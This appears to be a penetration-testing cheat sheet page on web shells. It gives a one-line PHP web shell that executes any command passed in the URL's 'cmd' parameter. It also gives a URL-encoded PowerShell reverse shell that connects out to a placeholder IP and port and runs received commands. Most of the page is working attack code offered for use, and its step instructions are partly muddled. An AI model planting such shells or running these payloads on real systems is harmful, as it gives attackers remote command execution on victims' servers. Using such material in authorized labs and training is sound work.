---
description: 'location in kali : ''/usr/share/webshells'''
---

# WEB

## using PHP

```php
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
```

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
**you can use link encoded commands to get a shell on a windows system using this link (change IP and PORT):**&#x20;

1. &#x20;run this command on terminal to create a get file

{% code overflow="wrap" %}
```bash
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
```
{% endcode %}

2. &#x20;

at the address bar of browser, open the file and run command you want (like the powershell command :arrow\_down:)

<img src="../../.gitbook/assets/image (3).png" alt="" data-size="original">

{% code overflow="wrap" %}
```
powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
```
{% endcode %}
{% endhint %}
